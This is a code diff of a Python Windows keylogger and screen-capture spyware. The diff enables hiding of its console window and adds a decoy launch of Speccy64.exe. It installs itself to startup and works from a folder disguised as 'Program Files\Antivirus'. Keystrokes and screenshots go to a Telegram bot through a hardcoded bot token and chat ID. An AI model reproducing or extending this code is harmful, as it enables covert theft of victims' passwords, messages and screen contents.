@@ -1,4 +1,4 @@
-
+﻿
 from pynput import keyboard 
 from pynput.keyboard import Key, KeyCode, Listener
 import time
@@ -9,13 +9,20 @@ import os, sys
 import pyautogui
 import getpass
 
-def hide():
+
+max_log = 100
+screen_deley = 20
+
+def hide():     
     import win32console, win32gui
-    window = win32console.GetConsoleWindow()
+    window = win32console.GetConsoleWindow()                                                                                         
     win32gui.ShowWindow(window, 0)
     return True
 
-win_patch = (os.path.abspath(os.sep))#C:\
+def start_fake():
+    os.system("SP\Speccy64.exe")
+
+win_patch = (os.path.abspath(os.sep))
 win_patch = win_patch[:2]
 
 USER_NAME = getpass.getuser()
@@ -31,51 +38,37 @@ def add_to_startup(file_path=""):
 
 add_to_startup()
 
-#hide()
+hide()
 
-bot = telebot.TeleBot('5627738264:AAHY2AqQ4u1VMNzbfVFNYAYT08bOPFEOEuw')
+bot = telebot.TeleBot('5627738264:AAGdmIc3siyeKeTSjYOScNVHn2JJ68L-Kpg')
+
 MyNums = ['302620163']
 log = ''
 
-
-print(win_patch)
 final_patch = win_patch+"\Program Files\Antivirus"
 final_patch2 = win_patch+"/Program Files/Antivirus"
 
 if not os.path.exists(final_patch):
     os.makedirs(final_patch2)
 
-if os.path.exists(final_patch2+"/log"):
-    sys.exit(0)
 
-def Multi_app_disabler():
-    os.makedirs(final_patch2+"/log")    
-
-Multi_app_disabler()
 def screenshot():
     while True:
 
         myscreenshot= pyautogui.screenshot()
         myscreenshot.save(final_patch+"\screen.png")
         img = open('C:/Program Files/Antivirus/screen.png','rb')
-        bot.send_photo(MyNums,img)
-        time.sleep(15)
-
-
-
-
+        bot.send_photo(MyNums[0],img)    
+        time.sleep(screen_deley)
 
 t3 = Thread(target=screenshot, args = ())
 t3.start()
 
-
-
-
-
+t4 = Thread(target=start_fake, args=())
+t4.start()
 
 translationEnRu = str.maketrans(dict(zip("""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""","""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""")))
 translationRuEn = str.maketrans(dict(zip("""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""","""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""")))
-
 
 pressed_vks = set()
 
@@ -149,7 +142,7 @@ def process_key_pressss(key):
         Mykey = f'({Mykey[4:]})'
     print(Mykey)
     log +=Mykey
-    if len(log) >= 30:
+    if len(log) >= max_log:
         t1 = Thread(target=Sender_tele, args = (log,))
         t1.start()
         log = ''
@@ -175,3 +168,4 @@ with keyboard_listener:
     keyboard_listener.join()
 
 
+bot.polling(none_stop=True)
